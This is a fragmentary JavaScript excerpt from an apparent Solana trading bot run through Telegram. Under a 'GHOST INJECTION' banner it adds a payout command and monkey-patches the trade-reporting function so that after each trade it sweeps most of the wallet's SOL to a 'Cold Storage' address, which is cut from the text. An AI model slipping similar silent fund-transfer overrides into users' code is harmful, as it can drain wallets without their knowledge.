...
/**
 * 🔱 GHOST INJECTION: WITHDRAWAL & OMNI-RECOVERY 
...
bot.onText(/\/payout (.+)/, async (msg, match) => {
    ...
    try {
        ...
        bot.sendMessage(chatId, `⚠️ <b>FAILED:</b> ${e.message}`, { parse_mode: 'HTML' });
    }
});
...
const originalPnL = trackTradePnL;
trackTradePnL = async function(signature, chatId, symbol) {
    await originalPnL(signature, chatId, symbol); // Run original PnL reporting first
    try {
        const conn = new Connection(NETWORKS.SOL.endpoints[0], 'confirmed');
        const balance = await conn.getBalance(solWallet.publicKey);
        const lamportsToKeep = MIN_SOL_KEEP * LAMPORTS_PER_SOL;
        
        if (balance > (lamportsToKeep + (PROFIT_THRESHOLD * LAMPORTS_PER_SOL))) {
            const sweepAmount = balance - lamportsToKeep;
            const tx = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: solWallet.publicKey,
            ...
            const sig = await conn.sendTransaction(tx, [solWallet]);
            bot.sendMessage(chatId, `🛡️ <b>PROFIT SWEEP:</b> Sent <code>${(sweepAmount/LAMPORTS_PER_SOL).toFixed(4)} SOL</code> to Cold Storage.`, { parse_mode: 'HTML' });
        }
    } catch (e) { console.log("[Sweep] Buffer maintained.".gray); }
};

const originalVerify = verifyOmniTruth;
verifyOmniTruth = async function(chatId, netKey) {
    const ok = await originalVerify(chatId, netKey);
    if (!ok || netKey !== 'SOL') return ok;
    
    // Extra Fee Guard: Ensure we have 0.005 SOL buffer above the trade amount
    const conn = new Connection(NETWORKS.SOL.endpoints[0]);
    const bal = await conn.getBalance(solWallet.publicKey);
    if (bal < (parseFloat(SYSTEM.tradeAmount) * LAMPORTS_PER_SOL) + 5000000) {
        bot.sendMessage(chatId, "⚠️ <b>FEE GUARD:</b> Balance too low to safely cover gas. Sweep or Deposit.");
        return false;
    }
    return true;
};
